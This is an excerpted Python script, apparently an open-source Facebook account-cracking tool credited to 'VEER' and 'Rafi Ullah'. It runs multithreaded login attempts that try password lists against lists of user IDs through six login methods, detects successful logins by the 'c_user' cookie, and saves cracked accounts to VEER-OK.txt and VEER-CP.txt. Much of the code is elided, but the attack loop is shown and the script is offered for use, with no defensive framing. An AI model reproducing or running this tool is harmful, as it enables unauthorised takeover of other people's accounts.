#created by VEER aka Aryan chaudhary
#open source by VEER
#github= VEER-XD
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/VEER-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
[+]==============================================
[+] CREATED BY   :  RAFI ULLAH
[+] TEAM               :  RAFI ULLAH–X–ZEESHAN
[+] ON GITHUB     :  VEER-XD
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.2
[+]=============================================="""
...
def VEER():
    ...
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/profile.php?id=100001687800616")
    else:
...
def VEER1():
	...
	print("[+]==============================================")
	VEERlovesyou = input("[+] [CHOOSE] :- ")
	if VEERlovesyou in ['y','Y','1','yes','YES','Yes']:
		VEER_xd.append('y')
	else:
		VEER_xd.append('n')
	print("[+]==============================================")
	...
	print("[+]==============================================")
	VEERtop = input("[+] [CHOOSE] :- ")
	if VEERtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{VEERfire}')
		...
		for guru in user:
			...
			if VEERfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif VEERfire =='2':yaari.submit(p,uid,pwx,tl)
			elif VEERfire =='3':yaari.submit(x,uid,pwx,tl)
			elif VEERfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif VEERfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif VEERfire =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in VEER-OK.txt,VEER-CP.txt')
...
def VEER5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if VEERfire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif VEERfire =='2':manshera.submit(p,uid,pwx,tl)
			elif VEERfire =='3':manshera.submit(x,uid,pwx,tl)
			elif VEERfire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif VEERfire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif VEERfire =='6':manshera.submit(d,uid,pwx,tl)
			else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[VEER-CP] '+cid+' | '+ps+'\33[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-VEER] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-VEER] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-VEER] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-VEER] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-VEER] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-VEER] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
